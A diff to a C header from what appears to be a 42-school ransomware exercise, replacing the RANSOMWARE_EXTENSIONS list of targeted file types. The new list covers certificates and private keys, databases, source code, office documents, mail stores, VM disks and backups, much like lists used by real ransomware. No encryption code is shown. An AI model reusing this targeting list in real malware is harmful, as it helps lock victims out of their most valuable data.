@@ -6,7 +6,7 @@
 /*   By: bguyot <bguyot@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/19 10:29:08 by bguyot            #+#    #+#             */
-/*   Updated: 2023/05/19 17:31:02 by bguyot           ###   ########.fr       */
+/*   Updated: 2023/05/20 09:37:11 by bguyot           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,21 +15,22 @@
 #define VERSION "1.3.5b"
 
 #define RANSOMWARE_EXTENSIONS 													\
-        ".123", ".3dm", ".3ds", ".accdb", ".ai", ".aspx", ".asx", ".avi", 		\
-        ".bak", ".bmp", ".brd", ".bz2", ".c", ".cer", ".cfg", ".class", 		\
-        ".cpp", ".crt", ".csr", ".csv", ".db", ".dbf", ".dch", ".dif", 			\
-        ".dip", ".djvu", ".doc", ".docx", ".dot", ".dotx", ".dwg", ".eml", 		\
-        ".fla", ".flv", ".frm", ".gif", ".gpg", ".gz", ".hwp", ".ibd", 			\
-        ".iso", ".jar", ".java", ".jpeg", ".jpg", ".js", ".jsp", ".key", 		\
-        ".lay", ".lay6", ".ldf", ".m3u", ".m4u", ".max", ".mdb", ".mdf", 		\
-        ".mid", ".mkv", ".mov", ".mp3", ".mp4", ".mpeg", ".mpg", ".ms11", 		\
-        ".msi", ".myd", ".myi", ".nef", ".note", ".odb", ".odg", ".odp", 		\
-        ".ods", ".odt", ".onetoc2", ".ost", ".otg", ".otp", ".ots", ".ott", 	\
-        ".p12", ".p7b", ".p7c", ".pdf", ".pem", ".php", ".pl", ".png", 			\
-        ".pot", ".potx", ".pps", ".ppsx", ".ppt", ".pptx", ".psd", ".rar", 		\
-        ".raw", ".rtf", ".sch", ".sldm", ".sldx", ".slk", ".sql", ".sqlite3", 	\
-        ".svg", ".swf", ".sxc", ".sxd", ".sxi", ".sxm", ".sxw", ".tar", ".tbk", \
-        ".tgz", ".tif", ".tiff", ".txt", ".uop", ".uot", ".vbs", ".vcd", 		\
-        ".vdi", ".vmdk", ".vmx", ".vmxf", ".vsd", ".wav", ".wb2", ".wk1", 		\
-        ".wks", ".wma", ".wmv", ".wpd", ".wps", ".xlc", ".xlm", ".xls", ".xlsx",\
-        ".xlt", ".xltx", ".xlw", ".xml", ".zip"
+	".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott",		\
+	".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc",		\
+	".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop",		\
+	".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", 		\
+	".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf", ".odb", ".frm", ".myd",		\
+	".myi", ".ibd", ".mdf",	".ldf", ".sln", ".suo", ".cpp", ".pas", ".asm",		\
+	".cmd", ".bat", ".ps1", ".vbs", ".dip", ".dch", ".sch", ".brd", ".jsp",		\
+	".php", ".asp", ".java", ".jar", ".class", ".mp3", ".wav", ".swf", ".fla",	\
+	".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp",	\
+	".mkv", ".3g2",	".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg",	\
+	".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", 	\
+	".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar",	\
+	".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk",	\
+	".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt",			\
+	".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt",	\
+	".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", 	\
+	".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt",		\
+	".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx",\
+	".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
